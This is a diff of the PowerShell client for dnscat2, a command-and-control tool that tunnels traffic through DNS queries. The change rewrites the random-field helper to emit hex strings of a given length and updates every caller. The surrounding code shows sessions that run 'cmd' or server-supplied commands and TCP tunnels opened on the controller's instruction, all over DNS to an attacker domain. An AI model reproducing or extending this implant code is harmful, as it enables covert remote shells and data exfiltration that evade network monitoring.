@@ -24,8 +24,8 @@ function Convert-HexToString ($Hex) {
     return $StringData
 }
 
-function New-RandomDNSField {
-    return [string](Get-Random -Maximum 9999 -Minimum 1000)
+function New-RandomDNSField ($Length) {
+    return [string]((1..$Length | % { 0,1,2,3,4,5,6,7,8,9,'A','B','C','D','E','F' | Get-Random }) -join "")
 }
 
 function Update-Dnscat2ACK ($Data, $AcknowledgementNumber) {
@@ -43,15 +43,15 @@ function Compare-SequenceNumber ($SequenceNumber, $AcknowledgementNumber) {
 }
 
 function New-Dnscat2SYN ($Domain, $SessionId, $SequenceNumber, $Options) {
-    return ((New-RandomDNSField) + "00" + $SessionId + $SequenceNumber + $Options + "." + $Domain)
+    return ((New-RandomDNSField 4) + "00" + $SessionId + $SequenceNumber + $Options + "." + $Domain)
 }
 
 function New-Dnscat2FIN ($Domain, $SessionId) {
-    return ((New-RandomDNSField) + "02" + $SessionId + "00" + "." + $Domain)
+    return ((New-RandomDNSField 4) + "02" + $SessionId + "00" + "." + $Domain)
 }
 
 function New-Dnscat2MSG ($Domain, $SessionId, $SequenceNumber, $AcknowledgementNumber, $Data) {
-    return ((New-RandomDNSField) + "01" + $SessionId + $SequenceNumber + $AcknowledgementNumber + $Data + "." + $Domain)
+    return ((New-RandomDNSField 4) + "01" + $SessionId + $SequenceNumber + $AcknowledgementNumber + $Data + "." + $Domain)
 }
 
 function Get-NextDnscat2Data ($DataQueue, $MaxMSGDataSize) {
@@ -151,7 +151,7 @@ function ConvertTo-Dnscat2Packet ($RawPacket) {
 }
 
 function Start-Dnscat2Session ($SessionId, $Options, $Domain, $DNSServer, $DNSPort, $MaxPacketSize, $LookupTypes, $Delay, $Driver, $DriverOptions) {
-    $SequenceNumber = (New-RandomDNSField)
+    $SequenceNumber = (New-RandomDNSField 4)
     
     $Packet = ConvertTo-Dnscat2Packet (Send-Dnscat2Packet (New-Dnscat2SYN $Domain $SessionId $SequenceNumber $Options) $Domain $DNSServer $DNSPort $LookupTypes)
     
@@ -263,7 +263,7 @@ function Read-FromDnscat2Tunnel ($Session, $TunnelId) {
 
         # Queue tunnel packets
         $Data = Convert-BytesToHex $Data
-        $PacketId = (New-RandomDNSField)
+        $PacketId = (New-RandomDNSField 4)
         $PacketId = ([Convert]::ToString(([convert]::ToUInt16($PacketId, 16) -band ( -bnot [uint16]([Math]::Floor(1 * [Math]::Pow(2,15))))),16)).PadLeft(4, '0')
         $PacketLengthField = ([Convert]::ToString(($PacketId.Length/2 + 2 + $TunnelId.Length/2 + $Data.Length/2),16)).PadLeft(8, '0')
         $DriverData = ($PacketLengthField + $PacketId + "1001" + $TunnelId + $Data)
@@ -348,7 +348,7 @@ function Update-Dnscat2CommandSession ($Session) {
             {
                 try {
                     $NewSessionName = $Session.CommandFields
-                    $NewSession = Start-Dnscat2Session (New-RandomDNSField) ("0001" + $NewSessionName) $Session.Domain $Session.DNSServer $Session.DNSPort $Session.MaxPacketSize $Session.LookupTypes $Session.Delay "exec" "cmd"
+                    $NewSession = Start-Dnscat2Session (New-RandomDNSField 4) ("0001" + $NewSessionName) $Session.Domain $Session.DNSServer $Session.DNSPort $Session.MaxPacketSize $Session.LookupTypes $Session.Delay "exec" "cmd"
                     $Session.NewSessions.Add($NewSession.SessionId, $NewSession)
                     $PacketLengthField = ([Convert]::ToString((4 + $NewSession.SessionId.Length/2),16)).PadLeft(8, '0')
                     $DriverData = ($PacketLengthField + $Session.PacketIdBF + "0001" + $NewSession.SessionId)
@@ -367,7 +367,7 @@ function Update-Dnscat2CommandSession ($Session) {
                 try {
                     $NewSessionName = $Session.CommandFields.split("00")[0]
                     $NewSessionCommand = Convert-HexToString $Session.CommandFields.split("00")[2]
-                    $NewSession = Start-Dnscat2Session (New-RandomDNSField) ("0002" + $NewSessionName + '00') $Session.Domain $Session.DNSServer $Session.DNSPort $Session.MaxPacketSize $Session.LookupTypes $Session.Delay "exec" $NewSessionCommand
+                    $NewSession = Start-Dnscat2Session (New-RandomDNSField 4) ("0002" + $NewSessionName + '00') $Session.Domain $Session.DNSServer $Session.DNSPort $Session.MaxPacketSize $Session.LookupTypes $Session.Delay "exec" $NewSessionCommand
                     $Session.NewSessions.Add($NewSession.SessionId, $NewSession)
                     $PacketLengthField = ([Convert]::ToString((4 + $NewSession.SessionId.Length/2),16)).PadLeft(8, '0')
                     $DriverData = ($PacketLengthField + $Session.PacketIdBF + "0002" + $NewSession.SessionId)
@@ -429,7 +429,7 @@ function Update-Dnscat2CommandSession ($Session) {
                     $Tunnel = New-Object System.Collections.Hashtable
                     $Tunnel.Add("Host", (Convert-HexToString $Session["CommandFields"].Substring(0, $Session["CommandFields"].Length - 4)).Trim(0))
                     $Tunnel.Add("Port", [Convert]::ToUInt16($Session["CommandFields"].Substring($Session["CommandFields"].Length - 4), 16))
-                    $Tunnel.Add("TunnelId", ((New-RandomDNSField) + (New-RandomDNSField)))
+                    $Tunnel.Add("TunnelId", (New-RandomDNSField 8))
                     $Session["Tunnels"].Add($Tunnel.TunnelId, $Tunnel)
                     
                     ## START UP TUNNEL
@@ -690,7 +690,7 @@ function Start-Dnscat2 {
     
     $Sessions = New-Object System.Collections.Hashtable
     $DeadSessions = @()
-    $InitialSession = Start-Dnscat2Session (New-RandomDNSField) $SYNOptions $Domain $DNSServer $DNSPort $MaxPacketSize $LookupTypes $Delay $Driver $DriverOptions
+    $InitialSession = Start-Dnscat2Session (New-RandomDNSField 4) $SYNOptions $Domain $DNSServer $DNSPort $MaxPacketSize $LookupTypes $Delay $Driver $DriverOptions
     if ($InitialSession -eq 1) {
         return
     }
